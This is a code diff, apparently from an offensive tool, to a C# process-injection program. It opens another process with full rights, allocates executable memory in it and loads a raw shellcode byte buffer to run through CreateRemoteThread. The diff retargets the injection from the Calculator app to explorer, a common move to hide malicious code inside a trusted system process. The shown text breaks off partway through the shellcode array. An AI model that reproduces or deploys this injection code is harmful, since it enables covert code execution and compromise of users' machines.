@@ -20,7 +20,7 @@ namespace Inject
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);
         static void Main(string[] args)
         {
-            IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetProcessesByName("CalculatorApp")[0].Id);
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetProcessesByName("explorer")[0].Id);
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             byte[] buf = new byte[780] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                                         0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
